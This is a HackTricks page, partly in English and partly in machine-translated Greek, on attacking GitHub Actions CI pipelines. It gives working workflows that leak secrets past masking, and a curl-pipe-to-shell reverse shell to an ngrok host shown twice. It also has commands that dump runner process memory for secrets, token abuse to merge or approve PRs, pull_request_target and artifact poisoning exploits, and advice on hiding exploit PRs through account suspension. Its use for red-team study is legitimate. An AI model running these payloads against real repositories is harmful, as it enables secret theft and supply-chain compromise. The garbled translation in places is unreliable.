# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **Κλέψτε** τα **μυστικά** από αυτό το repo/οργάνωση.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **Execute code in custom workers** (if custom workers are used) and try to pivot from there.
* **Overwrite** repository **code**.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromise** **deployments** and other **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**μυστικό**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Έγκριση PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Δημιουργία PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Σημειώστε ότι σε πολλές περιπτώσεις θα μπορείτε να βρείτε **tokens χρηστών github μέσα σε περιβάλλοντα Github Actions ή στα μυστικά**. Αυτά τα tokens μπορεί να σας δώσουν περισσότερα δικαιώματα πάνω στο αποθετήριο και την οργάνωση.
{% endhint %}

<details>

<summary>Λίστα μυστικών στην έξοδο του Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Πάρτε αντίστροφη θήκη με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Είναι δυνατόν να ελέγξετε τα δικαιώματα που έχουν δοθεί σε ένα Github Token σε άλλα αποθετήρια χρηστών **ελέγχοντας τα αρχεία καταγραφής** των ενεργειών:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Επιτρεπόμενη Εκτέλεση

{% hint style="info" %}
Αυτή θα ήταν η πιο εύκολη μέθοδος για να συμβιβαστούν οι Github actions, καθώς αυτή η περίπτωση υποθέτει ότι έχετε πρόσβαση για **δημιουργία νέου αποθετηρίου στην οργάνωση**, ή έχετε **δικαιώματα εγγραφής σε ένα αποθετήριο**.

Αν βρίσκεστε σε αυτό το σενάριο, μπορείτε απλά να ελέγξετε τις [τεχνικές Μετά την Εκμετάλλευση](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Εκτέλεση από Δημιουργία Αποθετηρίου

Σε περίπτωση που τα μέλη μιας οργάνωσης μπορούν να **δημιουργήσουν νέα αποθετήρια** και μπορείτε να εκτελέσετε github actions, μπορείτε να **δημιουργήσετε ένα νέο αποθετήριο και να κλέψετε τα μυστικά που έχουν οριστεί σε επίπεδο οργάνωσης**.

### Εκτέλεση από Νέο Κλάδο

Αν μπορείτε να **δημιουργήσετε ένα νέο κλάδο σε ένα αποθετήριο που ήδη περιέχει μια ρυθμισμένη Github Action**, μπορείτε να **τροποποιήσετε** αυτήν, **να ανεβάσετε** το περιεχόμενο και στη συνέχεια να **εκτελέσετε αυτήν την ενέργεια από τον νέο κλάδο**. Με αυτόν τον τρόπο μπορείτε να **εξάγετε μυστικά σε επίπεδο αποθετηρίου και οργάνωσης** (αλλά πρέπει να γνωρίζετε πώς ονομάζονται).

Μπορείτε να κάνετε την τροποποιημένη ενέργεια εκτελέσιμη **χειροκίνητα,** όταν **δημιουργείται μια PR** ή όταν **ωθείται κάποιος κώδικας** (ανάλογα με το πόσο θόρυβο θέλετε να κάνετε):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Υπάρχουν διάφοροι ενεργοποιητές που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **εκτελέσει μια Github Action από άλλο αποθετήριο**. Εάν αυτές οι ενεργοποιήσιμες ενέργειες είναι κακώς ρυθμισμένες, ένας επιτιθέμενος θα μπορούσε να είναι σε θέση να τις παραβιάσει.
{% endhint %}

### `pull_request`

Ο ενεργοποιητής ροής **`pull_request`** θα εκτελεί τη ροή κάθε φορά που λαμβάνεται ένα pull request με κάποιες εξαιρέσεις: από προεπιλογή, αν είναι η **πρώτη φορά** που **συνεργάζεστε**, κάποιος **διαχειριστής** θα χρειαστεί να **εγκρίνει** την **εκτέλεση** της ροής:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Καθώς ο **προεπιλεγμένος περιορισμός** ισχύει για **πρώτους** συνεισφέροντες, θα μπορούσατε να συμβάλετε **διορθώνοντας ένα έγκυρο σφάλμα/τυπογραφικό λάθος** και στη συνέχεια να στείλετε **άλλα PRs για να εκμεταλλευτείτε τα νέα σας δικαιώματα `pull_request`**.

**Το δοκίμασα και δεν λειτουργεί**: ~~Μια άλλη επιλογή θα ήταν να δημιουργήσετε έναν λογαριασμό με το όνομα κάποιου που συνέβαλε στο έργο και να διαγράψετε τον λογαριασμό του.~~
{% endhint %}

Επιπλέον, από προεπιλογή **αποτρέπει τις δικαιώματα εγγραφής** και **πρόσβαση σε μυστικά** στο στοχευμένο αποθετήριο όπως αναφέρεται στα [**έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Με την εξαίρεση του `GITHUB_TOKEN`, **τα μυστικά δεν μεταφέρονται στον εκτελεστή** όταν μια ροή ενεργοποιείται από ένα **forked** αποθετήριο. Το **`GITHUB_TOKEN` έχει δικαιώματα μόνο για ανάγνωση** σε pull requests **από forked αποθετήρια**.

Ένας επιτιθέμενος θα μπορούσε να τροποποιήσει τον ορισμό της Github Action προκειμένου να εκτελέσει αυθαίρετα πράγματα και να προσθέσει αυθαίρετες ενέργειες. Ωστόσο, δεν θα είναι σε θέση να κλέψει μυστικά ή να αντικαταστήσει το repo λόγω των αναφερόμενων περιορισμών.

{% hint style="danger" %}
**Ναι, αν ο επιτιθέμενος αλλάξει στο PR την github action που θα ενεργοποιηθεί, η Github Action του θα είναι αυτή που θα χρησιμοποιηθεί και όχι αυτή από το αρχικό repo!**
{% endhint %}

Καθώς ο επιτιθέμενος ελέγχει επίσης τον κώδικα που εκτελείται, ακόμη και αν δεν υπάρχουν μυστικά ή δικαιώματα εγγραφής στο `GITHUB_TOKEN`, ένας επιτιθέμενος θα μπορούσε για παράδειγμα να **ανεβάσει κακόβουλα αρχεία**.

### **`pull_request_target`**

Ο ενεργοποιητής ροής **`pull_request_target`** έχει **δικαιώματα εγγραφής** στο στοχευμένο αποθετήριο και **πρόσβαση σε μυστικά** (και δεν ζητά άδεια).

Σημειώστε ότι ο ενεργοποιητής ροής **`pull_request_target`** **εκτελείται στο βασικό πλαίσιο** και όχι σε αυτό που παρέχεται από το PR (για να **μην εκτελείται μη αξιόπιστος κώδικας**). Για περισσότερες πληροφορίες σχετικά με το `pull_request_target` [**ελέγξτε τα έγγραφα**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Επιπλέον, για περισσότερες πληροφορίες σχετικά με αυτή τη συγκεκριμένη επικίνδυνη χρήση, ελέγξτε αυτήν την [**ανάρτηση στο blog του github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Μπορεί να φαίνεται ότι επειδή η **εκτελούμενη ροή** είναι αυτή που ορίζεται στη **βάση** και **όχι στο PR**, είναι **ασφαλές** να χρησιμοποιείτε **`pull_request_target`**, αλλά υπάρχουν **μερικές περιπτώσεις όπου δεν είναι**.

Και αυτή θα έχει **πρόσβαση σε μυστικά**.

### `workflow_run`

Ο ενεργοποιητής [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) επιτρέπει την εκτέλεση μιας ροής από μια διαφορετική όταν είναι `completed`, `requested` ή `in_progress`.

Σε αυτό το παράδειγμα, μια ροή είναι ρυθμισμένη να εκτελείται μετά την ολοκλήρωση της ξεχωριστής ροής "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull\_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](./#pull\_request).

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

{% hint style="danger" %}
However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

{% hint style="warning" %}
A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).
{% endhint %}

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD\_PRELOAD** or **NODE\_OPTIONS**.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

The thing problem is that if the **`path`** parameter isn't set, the artifact is extracted in the current directory and it can override files that could be later used or even executed in the workflow. Therefore, if the Artifact is vulnerable, an attacker could abuse this to compromise other workflows trusting the Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Αυτή θα μπορούσε να επιτεθεί με αυτό το ροή εργασίας:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Άλλες Εξωτερικές Προσβάσεις

### Απαγωγή Διαγραφέντος Namespace Repo

Εάν ένας λογαριασμός αλλάξει όνομα, ένας άλλος χρήστης θα μπορούσε να εγγραφεί με αυτό το όνομα μετά από κάποιο χρονικό διάστημα. Εάν ένα αποθετήριο είχε **λιγότερα από 100 αστέρια πριν την αλλαγή ονόματος**, το Github θα επιτρέψει στον νέο εγγεγραμμένο χρήστη με το ίδιο όνομα να δημιουργήσει ένα **αποθετήριο με το ίδιο όνομα** όπως αυτό που διαγράφηκε.

{% hint style="danger" %}
Έτσι, εάν μια ενέργεια χρησιμοποιεί ένα αποθετήριο από έναν ανύπαρκτο λογαριασμό, είναι ακόμα δυνατόν ένας επιτιθέμενος να δημιουργήσει αυτόν τον λογαριασμό και να συμβιβάσει την ενέργεια.
{% endhint %}

Εάν άλλα αποθετήρια χρησιμοποιούσαν **εξαρτήσεις από αυτά τα αποθετήρια του χρήστη**, ένας επιτιθέμενος θα είναι σε θέση να τα απαγάγει. Εδώ έχετε μια πιο ολοκληρωμένη εξήγηση: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Σε αυτή την ενότητα θα μιλήσουμε για τεχνικές που θα επιτρέψουν να **περάσουμε από ένα αποθετήριο σε άλλο**, υποθέτοντας ότι έχουμε κάποια πρόσβαση στο πρώτο (ελέγξτε την προηγούμενη ενότητα).
{% endhint %}

### Μολυσματική Κρυφή Μνήμη

Μια κρυφή μνήμη διατηρείται μεταξύ **των εκτελέσεων ροής εργασίας στην ίδια κλάδο**. Αυτό σημαίνει ότι εάν ένας επιτιθέμενος **συμβιβάσει** ένα **πακέτο** που στη συνέχεια αποθηκεύεται στην κρυφή μνήμη και **κατεβαίνει** και εκτελείται από μια **πιο προνομιούχα** ροή εργασίας, θα είναι σε θέση να **συμβιβάσει** και αυτή τη ροή εργασίας.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Μολυσματική Τέχνη

Οι ροές εργασίας θα μπορούσαν να χρησιμοποιούν **τέχνες από άλλες ροές εργασίας και ακόμη και αποθετήρια**, εάν ένας επιτιθέμενος καταφέρει να **συμβιβάσει** την Github Action που **ανεβάζει μια τέχνη** που χρησιμοποιείται αργότερα από μια άλλη ροή εργασίας, θα μπορούσε να **συμβιβάσει τις άλλες ροές εργασίας**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Μετά την Εκμετάλλευση από μια Ενέργεια

### Πρόσβαση σε AWS και GCP μέσω OIDC

Ελέγξτε τις παρακάτω σελίδες:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Πρόσβαση σε μυστικά <a href="#accessing-secrets" id="accessing-secrets"></a>

Εάν εισάγετε περιεχόμενο σε ένα σενάριο, είναι ενδιαφέρον να γνωρίζετε πώς μπορείτε να αποκτήσετε πρόσβαση σε μυστικά:

* Εάν το μυστικό ή το token έχει οριστεί σε μια **μεταβλητή περιβάλλοντος**, μπορεί να προσπελαστεί άμεσα μέσω του περιβάλλοντος χρησιμοποιώντας **`printenv`**.

<details>

<summary>Λίστα μυστικών στην έξοδο της Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Πάρτε αντίστροφη θήκη με μυστικά</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Αν το μυστικό χρησιμοποιείται **άμεσα σε μια έκφραση**, το παραγόμενο shell script αποθηκεύεται **στον δίσκο** και είναι προσβάσιμο.
* ```bash
cat /home/runner/work/_temp/*
```
* Για τις JavaScript actions, τα μυστικά αποστέλλονται μέσω μεταβλητών περιβάλλοντος.
* ```bash
ps axe | grep node
```
* Για μια **προσαρμοσμένη ενέργεια**, ο κίνδυνος μπορεί να διαφέρει ανάλογα με το πώς ένα πρόγραμμα χρησιμοποιεί το μυστικό που απέκτησε από το **επιχείρημα**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Κατάχρηση Αυτο-φιλοξενούμενων εκτελεστών

Ο τρόπος για να βρείτε ποιες **Github Actions εκτελούνται σε υποδομή εκτός Github** είναι να αναζητήσετε **`runs-on: self-hosted`** στη διαμόρφωση yaml της Github Action.

Οι **αυτο-φιλοξενούμενοι** εκτελεστές μπορεί να έχουν πρόσβαση σε **επιπλέον ευαίσθητες πληροφορίες**, σε άλλα **δικτυακά συστήματα** (ευάλωτα σημεία στο δίκτυο; υπηρεσία μεταδεδομένων;) ή, ακόμη και αν είναι απομονωμένοι και καταστραφούν, **περισσότερες από μία ενέργειες μπορεί να εκτελούνται ταυτόχρονα** και η κακόβουλη μπορεί να **κλέψει τα μυστικά** της άλλης.

Σε αυτο-φιλοξενούμενους εκτελεστές είναι επίσης δυνατό να αποκτηθούν τα **μυστικά από τη διαδικασία \_Runner.Listener**\_\*\* που θα περιέχει όλα τα μυστικά των ροών εργασίας σε οποιοδήποτε βήμα, εκχυλίζοντας τη μνήμη της: 

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Δείτε [**αυτή την ανάρτηση για περισσότερες πληροφορίες**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Είναι δυνατόν να δημιουργήσετε Github actions που θα **χτίσουν και θα αποθηκεύσουν μια εικόνα Docker μέσα στο Github**.\
Ένα παράδειγμα μπορεί να βρεθεί στην παρακάτω επεκτάσιμη ενότητα:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Όπως μπορείτε να δείτε στον προηγούμενο κώδικα, το Github registry φιλοξενείται στο **`ghcr.io`**.

Ένας χρήστης με δικαιώματα ανάγνωσης πάνω στο repo θα μπορεί στη συνέχεια να κατεβάσει την Docker Image χρησιμοποιώντας ένα προσωπικό access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Ευαίσθητες πληροφορίες στα αρχεία καταγραφής των Github Actions

Ακόμα και αν **Github** προσπαθεί να **ανιχνεύσει μυστικές τιμές** στα αρχεία καταγραφής των ενεργειών και **να τις αποφύγει**, **άλλα ευαίσθητα δεδομένα** που θα μπορούσαν να έχουν παραχθεί κατά την εκτέλεση της ενέργειας δεν θα κρυφτούν. Για παράδειγμα, ένα JWT υπογεγραμμένο με μια μυστική τιμή δεν θα κρυφτεί εκτός αν είναι [συγκεκριμένα ρυθμισμένο](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Καλύπτοντας τα Ίχνη σας

(Τεχνική από [**εδώ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Πρώτα απ' όλα, οποιοδήποτε PR έχει υποβληθεί είναι σαφώς ορατό στο κοινό στο Github και στον στοχοθετημένο λογαριασμό GitHub. Στο GitHub από προεπιλογή, **δεν μπορούμε να διαγράψουμε ένα PR από το διαδίκτυο**, αλλά υπάρχει μια ανατροπή. Για λογαριασμούς Github που είναι **ανασταλμένοι** από το Github, όλα τα **PRs τους διαγράφονται αυτόματα** και αφαιρούνται από το διαδίκτυο. Έτσι, για να κρύψετε τη δραστηριότητά σας, πρέπει είτε να κάνετε τον **λογαριασμό σας GitHub ανασταλμένο είτε να σημαδευτεί ο λογαριασμός σας**. Αυτό θα **κρύψει όλες τις δραστηριότητές σας** στο GitHub από το διαδίκτυο (βασικά θα αφαιρέσει όλα τα exploit PR σας)

Μια οργάνωση στο GitHub είναι πολύ προληπτική στην αναφορά λογαριασμών στο GitHub. Το μόνο που χρειάζεται να κάνετε είναι να μοιραστείτε “μερικά πράγματα” σε ένα Issue και θα φροντίσουν να ανασταλεί ο λογαριασμός σας σε 12 ώρες :p και εκεί το έχετε, κάνατε το exploit σας αόρατο στο github.

{% hint style="warning" %}
Ο μόνος τρόπος για μια οργάνωση να καταλάβει ότι έχει στοχοποιηθεί είναι να ελέγξει τα αρχεία καταγραφής του GitHub από το SIEM, καθώς από το UI του GitHub το PR θα έχει αφαιρεθεί.
{% endhint %}

## Εργαλεία

Τα παρακάτω εργαλεία είναι χρήσιμα για να βρείτε ροές εργασίας Github Action και ακόμη και να βρείτε ευάλωτες:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
